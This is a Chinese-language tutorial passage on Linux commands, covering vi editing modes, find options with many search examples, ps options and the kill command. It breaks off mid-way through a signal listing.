<h4 id="输入方式"><a href="#输入方式" class="headerlink" title="输入方式"></a>输入方式</h4><p>通过输入vi的插入命令（i）、附加命令（a）、打开命令（o）、替换命令（s）、修改命令(c）或取代命令（r）可以从命令方式进入输入方式。在输入方式下，从键盘上输入的所有字符都被插入到正在编辑的缓冲区中，被当做该文件的正文。进入输入方式后，输入的可见字符都在屏幕上显示出来，而编辑命令不再起作用，仅作为普通字母出现。例如，在命令方式下输入字母i，进到输入方式，然后再输入i，就在屏幕上相应光标处添加一个字母i。</p>
<p>由输入方式回到命令方式的办法是按下Esc键。如果已在命令方式下，那么按下Esc键就会发出“嘟嘟”声。为了确保用户想执行的vi命令是在命令方式下输入的，不妨多按几下Esc键，听到嘟声后再输入命令。</p>
<h4 id="ex转义方式"><a href="#ex转义方式" class="headerlink" title="ex转义方式"></a>ex转义方式</h4><p>vi和ex编辑器的功能是相同的，二者的主要区别是用户界面。在vi中，命令通常是单个字母，如a,x,r等。而在ex中，命令是以Enter；键结束的命令行。vi有一个专门的“转义”命令，可访问很多面向行的ex命令。为使用ex转义方式，可输入一个冒号（:）。作为ex命令提示符，冒号出现在状态行（通常在屏幕最下一行）。按下中断键（通常是Del键），可终止正在执行的命令。多数文件管理命令都是在ex转义方式下执行的（例如，读取文件，把编辑缓冲区的内容写到文件中等）。转义命令执行后，自动回到命令方式。例如：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">:<span class="number">1</span>,<span class="variable">$s</span><span class="regexp">/I/i</span><span class="regexp">/g 按Enter键</span></span><br></pre></td></tr></table></figure>
<p>则从文件第一行至文件末尾（$）将大写I全部替换成小写i。</p>
<h2 id="find命令"><a href="#find命令" class="headerlink" title="find命令"></a>find命令</h2><p>find命令用来在指定目录下查找文件。任何位于参数之前的字符串都将被视为欲查找的目录名。如果使用该命令时，不设置任何参数，则find命令将在当前目录下查找子目录与文件。并且将查找到的子目录和文件全部进行显示。</p>
<h3 id="语法-12"><a href="#语法-12" class="headerlink" title="语法"></a>语法</h3><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">find</span><span class="params">(选项)</span><span class="params">(参数)</span></span></span><br></pre></td></tr></table></figure>
<h3 id="选项-12"><a href="#选项-12" class="headerlink" title="选项"></a>选项</h3><figure class="highlight haml"><table><tr><td class="code"><pre><span class="line">-<span class="ruby">amin&lt;分钟&gt;：查找在指定时间曾被存取过的文件或目录，单位以分钟计算；</span></span><br><span class="line"><span class="ruby">-anewer&lt;参考文件或目录&gt;：查找其存取时间较指定文件或目录的存取时间更接近现在的文件或目录；</span></span><br><span class="line"><span class="ruby">-atime&lt;<span class="number">24</span>小时数&gt;：查找在指定时间曾被存取过的文件或目录，单位以<span class="number">24</span>小时计算；</span></span><br><span class="line"><span class="ruby">-cmin&lt;分钟&gt;：查找在指定时间之时被更改过的文件或目录；</span></span><br><span class="line"><span class="ruby">-cnewer&lt;参考文件或目录&gt;查找其更改时间较指定文件或目录的更改时间更接近现在的文件或目录；</span></span><br><span class="line"><span class="ruby">-ctime&lt;<span class="number">24</span>小时数&gt;：查找在指定时间之时被更改的文件或目录，单位以<span class="number">24</span>小时计算；</span></span><br><span class="line"><span class="ruby">-daystart：从本日开始计算时间；</span></span><br><span class="line"><span class="ruby">-depth：从指定目录下最深层的子目录开始查找；</span></span><br><span class="line"><span class="ruby">-empty：寻找文件大小为<span class="number">0</span> Byte的文件，或目录下没有任何子目录或文件的空目录；</span></span><br><span class="line"><span class="ruby">-exec&lt;执行指令&gt;：假设find指令的回传值为True，就执行该指令；</span></span><br><span class="line"><span class="ruby">-<span class="literal">false</span>：将find指令的回传值皆设为False；</span></span><br><span class="line"><span class="ruby">-fls&lt;列表文件&gt;：此参数的效果和指定“-ls”参数类似，但会把结果保存为指定的列表文件；</span></span><br><span class="line"><span class="ruby">-follow：排除符号连接；</span></span><br><span class="line"><span class="ruby">-fprint&lt;列表文件&gt;：此参数的效果和指定“-print”参数类似，但会把结果保存成指定的列表文件；</span></span><br><span class="line"><span class="ruby">-fprint<span class="number">0</span>&lt;列表文件&gt;：此参数的效果和指定“-print<span class="number">0</span>”参数类似，但会把结果保存成指定的列表文件；</span></span><br><span class="line"><span class="ruby">-fprintf&lt;列表文件&gt;&lt;输出格式&gt;：此参数的效果和指定“-printf”参数类似，但会把结果保存成指定的列表文件；</span></span><br><span class="line"><span class="ruby">-fstype&lt;文件系统类型&gt;：只寻找该文件系统类型下的文件或目录；</span></span><br><span class="line"><span class="ruby">-gid&lt;群组识别码&gt;：查找符合指定之群组识别码的文件或目录；</span></span><br><span class="line"><span class="ruby">-group&lt;群组名称&gt;：查找符合指定之群组名称的文件或目录；</span></span><br><span class="line"><span class="ruby">-help或——help：在线帮助；</span></span><br><span class="line"><span class="ruby">-ilname&lt;范本样式&gt;：此参数的效果和指定“-lname”参数类似，但忽略字符大小写的差别；</span></span><br><span class="line"><span class="ruby">-iname&lt;范本样式&gt;：此参数的效果和指定“-name”参数类似，但忽略字符大小写的差别；</span></span><br><span class="line"><span class="ruby">-inum&lt;inode编号&gt;：查找符合指定的inode编号的文件或目录；</span></span><br><span class="line"><span class="ruby">-ipath&lt;范本样式&gt;：此参数的效果和指定“-path”参数类似，但忽略字符大小写的差别；</span></span><br><span class="line"><span class="ruby">-iregex&lt;范本样式&gt;：此参数的效果和指定“-regexe”参数类似，但忽略字符大小写的差别；</span></span><br><span class="line"><span class="ruby">-links&lt;连接数目&gt;：查找符合指定的硬连接数目的文件或目录；</span></span><br><span class="line"><span class="ruby">-iname&lt;范本样式&gt;：指定字符串作为寻找符号连接的范本样式；</span></span><br><span class="line"><span class="ruby">-ls：假设find指令的回传值为Ture，就将文件或目录名称列出到标准输出；</span></span><br><span class="line"><span class="ruby">-maxdepth&lt;目录层级&gt;：设置最大目录层级；</span></span><br><span class="line"><span class="ruby">-mindepth&lt;目录层级&gt;：设置最小目录层级；</span></span><br><span class="line"><span class="ruby">-mmin&lt;分钟&gt;：查找在指定时间曾被更改过的文件或目录，单位以分钟计算；</span></span><br><span class="line"><span class="ruby">-mount：此参数的效果和指定“-xdev”相同；</span></span><br><span class="line"><span class="ruby">-mtime&lt;<span class="number">24</span>小时数&gt;：查找在指定时间曾被更改过的文件或目录，单位以<span class="number">24</span>小时计算；</span></span><br><span class="line"><span class="ruby">-name&lt;范本样式&gt;：指定字符串作为寻找文件或目录的范本样式；</span></span><br><span class="line"><span class="ruby">-newer&lt;参考文件或目录&gt;：查找其更改时间较指定文件或目录的更改时间更接近现在的文件或目录；</span></span><br><span class="line"><span class="ruby">-nogroup：找出不属于本地主机群组识别码的文件或目录；</span></span><br><span class="line"><span class="ruby">-noleaf：不去考虑目录至少需拥有两个硬连接存在；</span></span><br><span class="line"><span class="ruby">-nouser：找出不属于本地主机用户识别码的文件或目录；</span></span><br><span class="line"><span class="ruby">-ok&lt;执行指令&gt;：此参数的效果和指定“-exec”类似，但在执行指令之前会先询问用户，若回答“y”或“Y”，则放弃执行命令；</span></span><br><span class="line"><span class="ruby">-path&lt;范本样式&gt;：指定字符串作为寻找目录的范本样式；</span></span><br><span class="line"><span class="ruby">-perm&lt;权限数值&gt;：查找符合指定的权限数值的文件或目录；</span></span><br><span class="line"><span class="ruby">-print：假设find指令的回传值为Ture，就将文件或目录名称列出到标准输出。格式为每列一个名称，每个名称前皆有“./”字符串；</span></span><br><span class="line"><span class="ruby">-print<span class="number">0</span>：假设find指令的回传值为Ture，就将文件或目录名称列出到标准输出。格式为全部的名称皆在同一行；</span></span><br><span class="line"><span class="ruby">-printf&lt;输出格式&gt;：假设find指令的回传值为Ture，就将文件或目录名称列出到标准输出。格式可以自行指定；</span></span><br><span class="line"><span class="ruby">-prune：不寻找字符串作为寻找文件或目录的范本样式;</span></span><br><span class="line"><span class="ruby">-regex&lt;范本样式&gt;：指定字符串作为寻找文件或目录的范本样式；</span></span><br><span class="line"><span class="ruby">-size&lt;文件大小&gt;：查找符合指定的文件大小的文件；</span></span><br><span class="line"><span class="ruby">-<span class="literal">true</span>：将find指令的回传值皆设为True；</span></span><br><span class="line"><span class="ruby">-type&lt;文件类型&gt;：只寻找符合指定的文件类型的文件；</span></span><br><span class="line"><span class="ruby">-uid&lt;用户识别码&gt;：查找符合指定的用户识别码的文件或目录；</span></span><br><span class="line"><span class="ruby">-used&lt;日数&gt;：查找文件或目录被更改之后在指定时间曾被存取过的文件或目录，单位以日计算；</span></span><br><span class="line"><span class="ruby">-user&lt;拥有者名称&gt;：查找符和指定的拥有者名称的文件或目录；</span></span><br><span class="line"><span class="ruby">-version或——version：显示版本信息；</span></span><br><span class="line"><span class="ruby">-xdev：将范围局限在先行的文件系统中；</span></span><br><span class="line"><span class="ruby">-xtype&lt;文件类型&gt;：此参数的效果和指定“-type”参数类似，差别在于它针对符号连接检查。</span></span><br></pre></td></tr></table></figure>
<h3 id="参数-10"><a href="#参数-10" class="headerlink" title="参数"></a>参数</h3><p>起始目录：查找文件的起始目录。</p>
<h3 id="实例-11"><a href="#实例-11" class="headerlink" title="实例"></a>实例</h3><p>根据文件或者正则表达式进行匹配<br>列出当前目录及子目录下所有文件和文件夹</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="builtin-name">find</span> .</span><br></pre></td></tr></table></figure>
<p>在/home目录下查找以.txt结尾的文件名</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line"><span class="built_in">find</span> /<span class="built_in">home</span> -name <span class="string">"*.txt"</span></span><br></pre></td></tr></table></figure>

<p>同上，但忽略大小写</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line"><span class="built_in">find</span> /<span class="built_in">home</span> -iname <span class="string">"*.txt"</span></span><br></pre></td></tr></table></figure>
<p>当前目录及子目录下查找所有以.txt和.pdf结尾的文件</p>
<figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line"><span class="built_in">find</span> . \( -<span class="built_in">name</span> <span class="string">"*.txt"</span> -o -<span class="built_in">name</span> <span class="string">"*.pdf"</span> \)</span><br><span class="line"></span><br><span class="line">或</span><br><span class="line"></span><br><span class="line"><span class="built_in">find</span> . -<span class="built_in">name</span> <span class="string">"*.txt"</span> -o -<span class="built_in">name</span> <span class="string">"*.pdf"</span></span><br></pre></td></tr></table></figure>
<p>匹配文件路径或者文件</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"><span class="keyword">find</span> <span class="regexp">/usr/</span> -path <span class="string">"*local*"</span></span><br></pre></td></tr></table></figure>
<p>基于正则表达式匹配文件路径</p>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">find . -regex ".*<span class="symbol">\(</span><span class="symbol">\.</span>txt<span class="symbol">\|</span><span class="symbol">\.</span>pdf<span class="symbol">\)</span>$"</span><br></pre></td></tr></table></figure>
<p>同上，但忽略大小写</p>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">find . -iregex ".*<span class="symbol">\(</span><span class="symbol">\.</span>txt<span class="symbol">\|</span><span class="symbol">\.</span>pdf<span class="symbol">\)</span>$"</span><br></pre></td></tr></table></figure>
<p>否定参数<br>找出/home下不是以.txt结尾的文件</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line"><span class="built_in">find</span> /<span class="built_in">home</span> ! -name <span class="string">"*.txt"</span></span><br></pre></td></tr></table></figure>
<p>根据文件类型进行搜索</p>
<figure class="highlight dos"><table><tr><td class="code"><pre><span class="line"><span class="built_in">find</span> . -<span class="built_in">type</span> 类型参数</span><br></pre></td></tr></table></figure>
<p>类型参数列表：</p>
<ul>
<li>f 普通文件</li>
<li>l 符号连接</li>
<li>d 目录</li>
<li>c 字符设备</li>
<li>b 块设备</li>
<li>s 套接字</li>
<li>p Fifo<br>基于目录深度搜索<br>向下最大深度限制为3<figure class="highlight dos"><table><tr><td class="code"><pre><span class="line"><span class="built_in">find</span> . -maxdepth <span class="number">3</span> -<span class="built_in">type</span> f</span><br></pre></td></tr></table></figure>
搜索出深度距离当前目录至少2个子目录的所有文件<figure class="highlight dos"><table><tr><td class="code"><pre><span class="line"><span class="built_in">find</span> . -mindepth <span class="number">2</span> -<span class="built_in">type</span> f</span><br></pre></td></tr></table></figure>
根据文件时间戳进行搜索<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">find . -<span class="keyword">type</span> <span class="type">f </span>时间戳</span><br></pre></td></tr></table></figure>
UNIX/Linux文件系统每个文件都有三种时间戳：</li>
</ul>
<p>-访问时间（-atime/天，-amin/分钟）：用户最近一次访问时间。<br>-修改时间（-mtime/天，-mmin/分钟）：文件最后一次修改时间。<br>-变化时间（-ctime/天，-cmin/分钟）：文件数据元（例如权限等）最后一次修改时间。</p>
<p>搜索最近七天内被访问过的所有文件</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">find . -<span class="keyword">type</span> <span class="type">f </span>-atime -<span class="number">7</span></span><br></pre></td></tr></table></figure>
<p>搜索恰好在七天前被访问过的所有文件</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">find . -<span class="keyword">type</span> <span class="type">f </span>-atime <span class="number">7</span></span><br></pre></td></tr></table></figure>
<p>搜索超过七天内被访问过的所有文件</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">find . -<span class="keyword">type</span> <span class="type">f </span>-atime +<span class="number">7</span></span><br></pre></td></tr></table></figure>
<p>搜索访问时间超过10分钟的所有文件</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">find . -<span class="keyword">type</span> <span class="type">f </span>-amin +<span class="number">10</span></span><br></pre></td></tr></table></figure>
<p>找出比file.log修改时间更长的所有文件</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">find</span> . -<span class="built_in">type</span> <span class="keyword">f</span> -newer <span class="keyword">file</span>.<span class="built_in">log</span></span><br></pre></td></tr></table></figure>
<p>根据文件大小进行匹配</p>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line"><span class="built_in">find</span> . -<span class="built_in">type</span> f -<span class="built_in">size</span> 文件大小单元</span><br></pre></td></tr></table></figure>
<p>文件大小单元：</p>
<ul>
<li>b —— 块（512字节）</li>
<li>c —— 字节</li>
<li>w —— 字（2字节）</li>
<li>k —— 千字节</li>
<li>M —— 兆字节</li>
<li>G —— 吉字节</li>
</ul>
<p>搜索大于10KB的文件</p>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line"><span class="built_in">find</span> . -<span class="built_in">type</span> f -<span class="built_in">size</span> +<span class="number">10</span>k</span><br></pre></td></tr></table></figure>
<p>搜索小于10KB的文件</p>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line"><span class="built_in">find</span> . -<span class="built_in">type</span> f -<span class="built_in">size</span> <span class="number">-10</span>k</span><br></pre></td></tr></table></figure>
<p>搜索等于10KB的文件</p>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line"><span class="built_in">find</span> . -<span class="built_in">type</span> f -<span class="built_in">size</span> <span class="number">10</span>k</span><br></pre></td></tr></table></figure>
<p>删除匹配文件<br>删除当前目录下所有.txt文件</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">find . -<span class="keyword">type</span> f -<span class="type">name</span> "*.txt" -<span class="keyword">delete</span></span><br></pre></td></tr></table></figure>
<p>根据文件权限/所有权进行匹配<br>当前目录下搜索出权限为777的文件</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">find . -<span class="keyword">type</span> <span class="type">f </span>-perm <span class="number">777</span></span><br></pre></td></tr></table></figure>
<p>找出当前目录下权限不是644的php文件</p>
<figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line"><span class="built_in">find</span> . -<span class="built_in">type</span> f -<span class="built_in">name</span> <span class="string">"*.php"</span> ! -perm <span class="number">644</span></span><br></pre></td></tr></table></figure>
<p>找出当前目录用户tom拥有的所有文件</p>
<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">find . -<span class="keyword">type</span> f -<span class="keyword">user</span> <span class="title">tom</span></span><br></pre></td></tr></table></figure>
<p>找出当前目录用户组sunk拥有的所有文件</p>
<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">find . -<span class="keyword">type</span> f -<span class="keyword">group</span> <span class="title">sunk</span></span><br></pre></td></tr></table></figure>
<p>借助-exec选项与其他命令结合使用<br>找出当前目录下所有root的文件，并把所有权更改为用户tom</p>
<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">find .-<span class="keyword">type</span> f -<span class="keyword">user</span> <span class="title">root</span> -exec chown tom &#123;&#125; \;</span><br></pre></td></tr></table></figure>
<p>上例中，{} 用于与-exec选项结合使用来匹配所有文件，然后会被替换为相应的文件名。</p>
<p>找出自己家目录下所有的.txt文件并删除</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="builtin-name">find</span> <span class="variable">$HOME</span>/. -name <span class="string">"*.txt"</span> -ok rm &#123;&#125; \;</span><br></pre></td></tr></table></figure>
<p>上例中，-ok和-exec行为一样，不过它会给出提示，是否执行相应的操作。</p>
<p>查找当前目录下所有.txt文件并把他们拼接起来写入到all.txt文件中</p>
<figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line"><span class="built_in">find</span> . -<span class="built_in">type</span> f -<span class="built_in">name</span> <span class="string">"*.txt"</span> -<span class="built_in">exec</span> cat &#123;&#125; \;&gt; all.txt</span><br></pre></td></tr></table></figure>
<p>将30天前的.log文件移动到old目录中</p>
<figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line"><span class="built_in">find</span> . -<span class="built_in">type</span> f -mtime +<span class="number">30</span> -<span class="built_in">name</span> <span class="string">"*.log"</span> -<span class="built_in">exec</span> cp &#123;&#125; old \;</span><br></pre></td></tr></table></figure>
<p>找出当前目录下所有.txt文件并以“File:文件名”的形式打印出来</p>
<figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line"><span class="built_in">find</span> . -<span class="built_in">type</span> f -<span class="built_in">name</span> <span class="string">"*.txt"</span> -<span class="built_in">exec</span> printf <span class="string">"File: %s\n"</span> &#123;&#125; \;</span><br></pre></td></tr></table></figure>
<p>因为单行命令中-exec参数中无法使用多个命令，以下方法可以实现在-exec之后接受多条命令</p>
<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">-<span class="keyword">exec</span> ./<span class="keyword">text</span>.sh &#123;&#125; \;</span><br></pre></td></tr></table></figure>
<p>搜索但跳出指定的目录<br>查找当前目录或者子目录下所有.txt文件，但是跳过子目录sk</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="built_in">find</span> . -<span class="built_in">path</span> <span class="string">"./sk"</span> -prune -o -name <span class="string">"*.txt"</span> -<span class="built_in">print</span></span><br></pre></td></tr></table></figure>
<p>find其他技巧收集<br>要列出所有长度为零的文件</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="builtin-name">find</span> . -empty</span><br></pre></td></tr></table></figure>
<h2 id="ps命令"><a href="#ps命令" class="headerlink" title="ps命令"></a>ps命令</h2><p>ps命令用于报告当前系统的进程状态。可以搭配kill指令随时中断、删除不必要的程序。ps命令是最基本同时也是非常强大的进程查看命令，使用该命令可以确定有哪些进程正在运行和运行的状态、进程是否结束、进程有没有僵死、哪些进程占用了过多的资源等等，总之大部分信息都是可以通过执行该命令得到的。</p>
<h3 id="语法-13"><a href="#语法-13" class="headerlink" title="语法"></a>语法</h3><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">ps</span><span class="params">(选项)</span></span></span><br></pre></td></tr></table></figure>
<h3 id="选项-13"><a href="#选项-13" class="headerlink" title="选项"></a>选项</h3><figure class="highlight haml"><table><tr><td class="code"><pre><span class="line">-<span class="ruby">a：显示所有终端机下执行的程序，除了阶段作业领导者之外。</span></span><br><span class="line"><span class="ruby">a：显示现行终端机下的所有程序，包括其他用户的程序。</span></span><br><span class="line"><span class="ruby">-A：显示所有程序。</span></span><br><span class="line"><span class="ruby">-c：显示CLS和PRI栏位。</span></span><br><span class="line"><span class="ruby">c：列出程序时，显示每个程序真正的指令名称，而不包含路径，选项或常驻服务的标示。</span></span><br><span class="line"><span class="ruby">-C&lt;指令名称&gt;：指定执行指令的名称，并列出该指令的程序的状况。</span></span><br><span class="line"><span class="ruby">-d：显示所有程序，但不包括阶段作业领导者的程序。</span></span><br><span class="line"><span class="ruby">-e：此选项的效果和指定<span class="string">"A"</span>选项相同。</span></span><br><span class="line"><span class="ruby">e：列出程序时，显示每个程序所使用的环境变量。</span></span><br><span class="line"><span class="ruby">-f：显示UID,PPIP,C与STIME栏位。</span></span><br><span class="line"><span class="ruby">f：用ASCII字符显示树状结构，表达程序间的相互关系。</span></span><br><span class="line"><span class="ruby">-g&lt;群组名称&gt;：此选项的效果和指定<span class="string">"-G"</span>选项相同，当亦能使用阶段作业领导者的名称来指定。</span></span><br><span class="line"><span class="ruby">g：显示现行终端机下的所有程序，包括群组领导者的程序。</span></span><br><span class="line"><span class="ruby">-G&lt;群组识别码&gt;：列出属于该群组的程序的状况，也可使用群组名称来指定。</span></span><br><span class="line"><span class="ruby">h：不显示标题列。</span></span><br><span class="line"><span class="ruby">-H：显示树状结构，表示程序间的相互关系。</span></span><br><span class="line"><span class="ruby">-j或j：采用工作控制的格式显示程序状况。</span></span><br><span class="line"><span class="ruby">-l或l：采用详细的格式来显示程序状况。</span></span><br><span class="line"><span class="ruby">L：列出栏位的相关信息。</span></span><br><span class="line"><span class="ruby">-m或m：显示所有的执行绪。</span></span><br><span class="line"><span class="ruby">n：以数字来表示USER和WCHAN栏位。</span></span><br><span class="line"><span class="ruby">-N：显示所有的程序，除了执行ps指令终端机下的程序之外。</span></span><br><span class="line"><span class="ruby">-p&lt;程序识别码&gt;：指定程序识别码，并列出该程序的状况。</span></span><br><span class="line"><span class="ruby">p&lt;程序识别码&gt;：此选项的效果和指定<span class="string">"-p"</span>选项相同，只在列表格式方面稍有差异。</span></span><br><span class="line"><span class="ruby">r：只列出现行终端机正在执行中的程序。</span></span><br><span class="line"><span class="ruby">-s&lt;阶段作业&gt;：指定阶段作业的程序识别码，并列出隶属该阶段作业的程序的状况。</span></span><br><span class="line"><span class="ruby">s：采用程序信号的格式显示程序状况。</span></span><br><span class="line"><span class="ruby">S：列出程序时，包括已中断的子程序资料。</span></span><br><span class="line"><span class="ruby">-t&lt;终端机编号&gt;：指定终端机编号，并列出属于该终端机的程序的状况。</span></span><br><span class="line"><span class="ruby">t&lt;终端机编号&gt;：此选项的效果和指定<span class="string">"-t"</span>选项相同，只在列表格式方面稍有差异。</span></span><br><span class="line"><span class="ruby">-T：显示现行终端机下的所有程序。</span></span><br><span class="line"><span class="ruby">-u&lt;用户识别码&gt;：此选项的效果和指定<span class="string">"-U"</span>选项相同。</span></span><br><span class="line"><span class="ruby">u：以用户为主的格式来显示程序状况。</span></span><br><span class="line"><span class="ruby">-U&lt;用户识别码&gt;：列出属于该用户的程序的状况，也可使用用户名称来指定。</span></span><br><span class="line"><span class="ruby">U&lt;用户名称&gt;：列出属于该用户的程序的状况。</span></span><br><span class="line"><span class="ruby">v：采用虚拟内存的格式显示程序状况。</span></span><br><span class="line"><span class="ruby">-V或V：显示版本信息。</span></span><br><span class="line"><span class="ruby">-w或w：采用宽阔的格式来显示程序状况。　</span></span><br><span class="line"><span class="ruby">x：显示所有程序，不以终端机来区分。</span></span><br><span class="line"><span class="ruby">X：采用旧式的Linux i386登陆格式显示程序状况。</span></span><br><span class="line"><span class="ruby">-y：配合选项<span class="string">"-l"</span>使用时，不显示F(flag)栏位，并以RSS栏位取代ADDR栏位　。</span></span><br><span class="line"><span class="ruby">-&lt;程序识别码&gt;：此选项的效果和指定<span class="string">"p"</span>选项相同。</span></span><br><span class="line"><span class="ruby">--cols&lt;每列字符数&gt;：设置每列的最大字符数。</span></span><br><span class="line"><span class="ruby">--columns&lt;每列字符数&gt;：此选项的效果和指定<span class="string">"--cols"</span>选项相同。</span></span><br><span class="line"><span class="ruby">--cumulative：此选项的效果和指定<span class="string">"S"</span>选项相同。</span></span><br><span class="line"><span class="ruby">--deselect：此选项的效果和指定<span class="string">"-N"</span>选项相同。</span></span><br><span class="line"><span class="ruby">--forest：此选项的效果和指定<span class="string">"f"</span>选项相同。</span></span><br><span class="line"><span class="ruby">--headers：重复显示标题列。</span></span><br><span class="line"><span class="ruby">--help：在线帮助。</span></span><br><span class="line"><span class="ruby">--info：显示排错信息。</span></span><br><span class="line"><span class="ruby">--lines&lt;显示列数&gt;：设置显示画面的列数。</span></span><br><span class="line"><span class="ruby">--no-headers：此选项的效果和指定<span class="string">"h"</span>选项相同，只在列表格式方面稍有差异。</span></span><br><span class="line"><span class="ruby">--group&lt;群组名称&gt;：此选项的效果和指定<span class="string">"-G"</span>选项相同。</span></span><br><span class="line"><span class="ruby">--Group&lt;群组识别码&gt;：此选项的效果和指定<span class="string">"-G"</span>选项相同。</span></span><br><span class="line"><span class="ruby">--pid&lt;程序识别码&gt;：此选项的效果和指定<span class="string">"-p"</span>选项相同。</span></span><br><span class="line"><span class="ruby">--rows&lt;显示列数&gt;：此选项的效果和指定<span class="string">"--lines"</span>选项相同。</span></span><br><span class="line"><span class="ruby">--sid&lt;阶段作业&gt;：此选项的效果和指定<span class="string">"-s"</span>选项相同。</span></span><br><span class="line"><span class="ruby">--tty&lt;终端机编号&gt;：此选项的效果和指定<span class="string">"-t"</span>选项相同。</span></span><br><span class="line"><span class="ruby">--user&lt;用户名称&gt;：此选项的效果和指定<span class="string">"-U"</span>选项相同。</span></span><br><span class="line"><span class="ruby">--User&lt;用户识别码&gt;：此选项的效果和指定<span class="string">"-U"</span>选项相同。</span></span><br><span class="line"><span class="ruby">--version：此选项的效果和指定<span class="string">"-V"</span>选项相同。</span></span><br><span class="line"><span class="ruby">--widty&lt;每列字符数&gt;：此选项的效果和指定<span class="string">"-cols"</span>选项相同。</span></span><br></pre></td></tr></table></figure>
<h2 id="kill命令"><a href="#kill命令" class="headerlink" title="kill命令"></a>kill命令</h2><p>kill命令用来删除执行中的程序或工作。kill可将指定的信息送至程序。预设的信息为SIGTERM(15),可将指定程序终止。若仍无法终止该程序，可使用SIGKILL(9)信息尝试强制删除程序。程序或工作的编号可利用ps指令或job指令查看。</p>
<h3 id="语法-14"><a href="#语法-14" class="headerlink" title="语法"></a>语法</h3><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">kill</span><span class="params">(选项)</span><span class="params">(参数)</span></span></span><br></pre></td></tr></table></figure>
<h3 id="选项-14"><a href="#选项-14" class="headerlink" title="选项"></a>选项</h3><figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"><span class="deletion">-a：当处理当前进程时，不限制命令名和进程号的对应关系；</span></span><br><span class="line"><span class="deletion">-l &lt;信息编号&gt;：若不加&lt;信息编号&gt;选项，则-l参数会列出全部的信息名称；</span></span><br><span class="line"><span class="deletion">-p：指定kill 命令只打印相关进程的进程号，而不发送任何信号；</span></span><br><span class="line"><span class="deletion">-s &lt;信息名称或编号&gt;：指定要送出的信息；</span></span><br><span class="line"><span class="deletion">-u：指定用户。</span></span><br></pre></td></tr></table></figure>
<h3 id="参数-11"><a href="#参数-11" class="headerlink" title="参数"></a>参数</h3><p>进程或作业识别号：指定要删除的进程或作业。</p>
<h3 id="实例-12"><a href="#实例-12" class="headerlink" title="实例"></a>实例</h3><p>列出所有信号名称：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"> kill -l</span><br><span class="line"> <span class="number">1</span>) SIGHUP       <span class="number">2</span>) SIGINT       <span class="number">3</span>) SIGQUIT      <span class="number">4</span>) SIGILL</span><br><span class="line"> <span class="number">5</span>) SIGTRAP      <span class="number">6</span>) SIGABRT      <span class="number">7</span>) SIGBUS       <span class="number">8</span>) SIGFPE</span><br><span class="line"> <span class="number">9</span>) SIGKILL     <span class="number">10</span>) SIGUSR1     <span class="number">11</span>) SIGSEGV     <span class="number">12</span>) SIGUSR2</span><br><span class="line"><span class="number">13</span>) SIGPIPE     <span class="number">14</span>) SIGALRM     <span class="number">15</span>) SIGTERM     <span class="number">16</span>) SIGSTKFLT</span><br><span class="line"><span class="number">17</span>) SIGCHLD     <span class="number">18</span>) SIGCONT     <span class="number">19</span>) SIGSTOP     <span class="number">20</span>) SIGTSTP</span><br><span class="line"><span class="number">21</span>) SIGTTIN     <span class="number">22</span>) SIGTTOU     <span class="number">23</span>) SIGURG      <span class="number">24</span>) SIGXCPU</span><br><span class="line"><span class="number">25</span>) SIGXFSZ     <span class="number">26</span>) SIGVTALRM   <span class="number">27</span>) SIGPROF     <span class="number">28</span>) SIGWINCH</span><br><span class="line"><span class="number">29</span>) SIGIO       <span class="number">30</span>) SIGPWR      <span class="number">31</span>) SIGSYS      <span class="number">34</span>) SIGRTMIN</span><br><span class="line"><span class="number">35</span>) SIGRTMIN+<span class="number">1</span>  <span class="number">36</span>) SIGRTMIN+<span class="number">2</span>  <span class="number">37</span>) SIGRTMIN+<span class="number">3</span>  <span class="number">38</span>) SIGRTMIN+<span class="number">4</span></span><br><span class="line"><span class="number">39</span>) SIGRTMIN+<span class="number">5</span>  <span class="number">40</span>) SIGRTMIN+<span class="number">6</span>  <span class="number">41</span>) SIGRTMIN+<span class="number">7</span>  <span class="number">42</span>) SIGRTMIN+<span class="number">8</span></span><br><span class="line"><span class="number">43</span>) SIGRTMIN+<span class="number">9</span>  <span class="number">44</span>) SIGRTMIN+<span class="number">10</span> <span class="number">45</span>) SIGRTMIN+<span class="number">11</span> <span class="number">46</span>) SIGRTMIN+<span class="number">12</span></span><br><span class="line"><span class="number">47</span>) SIGRTMIN+<span class="number">13</span> <span 